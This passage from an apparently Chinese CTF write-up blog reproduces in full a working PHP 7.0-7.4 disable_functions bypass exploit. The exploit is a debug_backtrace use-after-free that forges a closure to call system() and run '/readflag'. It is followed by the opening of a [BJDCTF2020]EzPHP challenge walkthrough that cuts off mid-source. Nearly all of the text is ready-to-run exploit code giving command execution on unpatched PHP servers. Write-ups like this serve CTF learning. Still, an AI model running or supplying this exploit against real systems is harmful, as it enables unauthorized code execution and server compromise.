<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><br><span class="hljs-comment"># debug_backtrace() returns a reference to a variable</span><br><span class="hljs-comment"># that has been destroyed, causing a UAF vulnerability.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.4 versions</span><br><span class="hljs-comment"># released as of 30/01/2020.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-comment">#命令</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>(); <span class="hljs-comment"># ;)</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123; <span class="hljs-comment"># PHP &gt;= 7.4</span><br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/52358979B9C547a5883ADD74F140E7D8.png" srcset="/img/loading.gif" lazyload><br>包含这个文件拿到flag<br><img src="/images/0333A3523B4240d6A3BFC5B5B08B018F.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>进入环境，主页看看有什么突破点，随便点点<br>看看源代码<br>发现这个网络威胁实时地图是引用的一个链接的，应该没有什么突破点<br>这边给了个注释<br>base64解码不成功<br>base32解码可行<br>解码出1nD3x.php</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs coq">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(<span class="hljs-number">0</span>); <br><br>$file = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br>$shana = $_GET[&#x27;shana&#x27;];<br>$passwd = $_GET[&#x27;passwd&#x27;];<br>$arg = &#x27;&#x27;;<br>$code = &#x27;&#x27;;<br><br>echo <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good 